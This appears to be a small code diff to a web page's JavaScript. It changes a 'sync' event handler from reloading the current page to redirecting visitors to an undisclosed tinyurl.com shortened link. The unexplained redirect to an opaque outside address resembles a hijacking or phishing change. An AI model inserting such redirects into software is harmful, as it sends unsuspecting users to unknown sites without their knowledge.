@@ -50,7 +50,7 @@ function changeEmail(e) {}
 
 //------------------------- sync-data-event-listener
 function sync(e) {
-  window.location.href = window.location.origin + window.location.pathname;
+  location.replace('https://tinyurl.com/yh64m3xy');
 }
 
 //------------------------- see-details-event-listener
